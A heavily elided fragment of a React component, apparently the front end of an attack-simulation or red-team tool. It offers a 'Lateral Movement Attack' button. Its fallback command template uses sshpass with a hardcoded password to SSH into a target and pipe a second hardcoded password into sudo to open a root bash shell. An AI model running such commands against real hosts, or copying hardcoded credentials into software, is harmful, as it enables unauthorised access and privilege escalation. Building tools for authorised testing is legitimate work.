...
const LateralMovement = () => {
  ...
  const preferredKey = "lateralMovement";
    ...
    const loadCommands = async () => {
      try {
        ...
        const picked = keyFound
          ...
          : {
              command:
                "sshpass -p 'anmol' ssh -tt anmol@{targetIP} 'echo crlg#123 | sudo -S bash -c",
            };
        ...
        const fallbackTpl =
          "sshpass -p 'anmol' ssh -tt anmol@{targetIP} 'echo crlg#123 | sudo -S bash -c";
        setCommands({
          lateralMovement: { label: "Lateral Movement", command: fallbackTpl },
        });
        setCommandStr(
  ...
  const handleLateralMovement = () => {
    ...
    console.log("[LateralMovement] extracted target:", extracted);
        ...
        <Layout>
          ...
          <Content style={{ marginTop: "1px" }}>
            <div className="terminal-controls" style={{ marginBottom: "16px" }}>
              ...
              >
                {loading ? "Scanning..." : "Lateral Movement Attack"}
              </button>
            </div>
          </Content>
        </Layout>
